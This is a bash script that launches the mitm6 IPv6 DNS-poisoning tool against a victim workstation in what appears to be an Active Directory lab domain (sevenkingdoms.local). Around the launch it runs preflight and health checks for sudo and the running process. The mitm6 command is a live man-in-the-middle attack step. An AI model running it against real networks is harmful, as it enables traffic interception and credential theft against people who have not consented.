#!/usr/bin/env bash
set -euo pipefail

IFACE="${IFACE:-vmnet10}"
DOMAIN="${DOMAIN:-north.sevenkingdoms.local}"
VICTIM="${VICTIM:-ws01.north.sevenkingdoms.local}"
LOG="${LOG:-/tmp/kingdoms-mitm6.log}"

EXISTING="$(pgrep -af '(^|[ /])mitm6([ ]|$)' || true)"
[[ -z "$EXISTING" ]] || {
  echo "FAIL: mitm6 is already running"
  echo "$EXISTING"
  exit 1
}

echo '===== SUDO PREFLIGHT ====='
sudo -v

rm -f "$LOG"
sudo -n stdbuf -oL -eL mitm6 -i "$IFACE" -d "$DOMAIN" -hw "$VICTIM" >"$LOG" 2>&1 &
sleep 3

pgrep -af '(^|[ /])mitm6([ ]|$)' || {
  echo "FAIL: mitm6 did not remain running"
  cat "$LOG"
  exit 1
}

if grep -Eq 'sudo: .*password|sudo: unable to read password|a password is required' "$LOG" 2>/dev/null; then
  echo 'FAIL: sudo authentication leaked into the background mitm6 launch' >&2
  cat "$LOG" >&2
  exit 1
fi

echo "PASS: mitm6 running, scoped to $VICTIM on $IFACE"
